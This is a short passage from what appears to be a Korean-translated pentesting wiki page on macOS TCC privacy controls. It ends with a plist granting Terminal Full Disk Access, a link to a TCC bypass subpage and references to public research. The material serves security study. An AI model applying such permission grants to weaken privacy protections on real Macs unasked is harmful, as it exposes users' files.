<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### TCC Bypasses


{{#ref}}
macos-tcc-bypasses/
{{#endref}}

## 참고 자료

- [1] [macOS TCC.db 심층 분석 - Rainforest QA Blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - com.apple.macl을 추적하는 script (brunerd의 Gist)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [com.apple.macl 추적 및 대응](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [실수와 의도적인 설계를 통한 macOS TCC 사용자 개인정보 보호 우회](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

{{#include ../../../../banners/hacktricks-training.md}}
